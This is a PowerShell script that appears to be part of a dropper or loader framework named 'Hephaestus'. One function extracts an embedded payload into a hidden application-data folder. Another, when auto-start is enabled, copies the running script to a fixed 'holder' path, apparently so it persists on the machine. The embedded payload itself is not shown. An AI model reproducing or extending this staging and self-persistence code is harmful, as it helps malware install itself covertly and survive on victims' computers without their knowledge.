. ./utils.ps1
. ./consts_holder.ps1


function DoBody_InitialExtract()
{
    $appDataFolder = Get-HephaestusFolder
    if (-not (Test-Path -Path $appDataFolder))
    {
        New-Item -Path $appDataFolder -ItemType Directory | Out-Null
    }
    $holderBodyFile = Get-BodyPath
    if (-not (Test-Path -Path $holderBodyFile))
    {
        ExtractEmbedding -inContent $xbody -outFile $holderBodyFile
    }
}

function DoHolder_AppData {
    
    function Is-HolderScript {
        $currentScriptPath = $global:MyInvocation.MyCommand.Definition
        $holderPath = Get-HolderPath
        return $currentScriptPath -eq $holderPath
    }

    try 
    {
        if ($server.autoStart)
        {
            $isAuto = Is-HolderScript
            writedbg "isAuto: $isAuto"
            if (-not $isAuto)
            {
                $currentScriptPath = $PSCommandPath
                if (-not $currentScriptPath) {
                    writedbg "This is not being run from a script file." -ForegroundColor Yellow
                    return
                }
            
                $holderPath = Get-HolderPath
                $holderFolder = Get-HephaestusFolder
            
                try {
                    if (-not (Test-Path $holderFolder)) {
                        New-Item -Path $holderFolder -ItemType Directory | Out-Null
                    }
            
                    Copy-Item -Path $currentScriptPath -Destination $holderPath -Force
                    writedbg "Script successfully copied to: $holderPath"
                } catch {
                    writedbg "Error copying script to Hephaestus path: $($_.Exception.Message)" -ForegroundColor Red
                }
            }
        }
    } catch {
        writedbg "Error DoAuto"
    }
}